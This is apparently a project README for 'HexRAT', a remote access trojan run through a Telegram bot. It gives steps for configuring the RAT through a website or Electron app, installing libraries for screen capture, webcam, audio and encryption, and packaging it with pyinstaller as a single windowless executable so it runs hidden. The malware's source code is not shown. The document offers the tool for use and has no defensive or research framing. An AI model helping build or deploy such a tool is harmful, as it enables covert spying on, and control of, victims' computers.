# hexrat-TelegramBot
HexRAT based on telegram bot
## Instalation

### 1. Web-Site

go on public/index.html or https://hexrat.netlify.app and build the RAT

download config.hex and move to v0.0.2 or v0.0.3

go on v0.0.2 or v0.0.3 and create file requirements.txt

put on
```bash
pyinstaller
pyautogui
pycaw
pillow
opencv-python
pycryptodome
requests
telebot
psutil
```
```bash
cd path/to/RAT/
pip install -r requirements.txt
pyinstaller --onefile --add-data "config.py;." --add-data "__init__.py;." --noconsole main.py
```

#### requirements
Python3

requirements.txt

### 2. App

go on app/

```bash
npm start
```

build the RAT

go on RAT/ in app/ and create file requirements.txt

put on
```bash
pyinstaller
pyautogui
pycaw
pillow
opencv-python
pycryptodome
requests
telebot
psutil
```
```bash
cd path/to/RAT/
pip install -r requirements.txt
pyinstaller --onefile --add-data "config.py;." --add-data "__init__.py;." --noconsole main.py
```

#### requirements
Node.js

express

electron

requirements.txt

## Visuals

![image](https://github.com/user-attachments/assets/09a6e74d-7315-40f4-85bd-d5ec467ee8e6)
![image](https://github.com/user-attachments/assets/e5370e43-c4ef-4ea0-97ed-89113497f40a)
![image](https://github.com/user-attachments/assets/1fd91859-04ec-41b2-acb3-94cc393146ce)


